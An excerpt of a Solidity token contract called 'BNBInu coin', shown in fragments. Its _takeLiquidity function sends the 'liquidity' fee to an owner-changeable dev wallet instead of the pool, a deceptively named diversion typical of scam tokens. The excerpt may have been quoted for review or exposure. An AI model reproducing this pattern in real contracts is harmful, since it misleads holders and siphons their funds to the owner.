...
contract BNBToken is Context, IERC20, Ownable {
    ...
    string private _name = "BNBInu coin";
    ...
    constructor (address _dev) public {
        ...
        // arbitrum one uniswap route
        // IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x4C60051384bd2d3C01bfc845Cf5F4b44bcbE9de5);
    ...
    function setDev(address new_dev) external onlyOwner() {
        dev = new_dev;
    }
    ...
    function _takeLiquidity(uint256 tLiquidity) private {
        uint256 currentRate =  _getRate();
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        _rOwned[dev] = _rOwned[dev].add(rLiquidity);

        // emit Transfer(sender, dev, tLiquidity);
        // _rOwned[dev] = _rOwned[dev].add(rLiquidity);
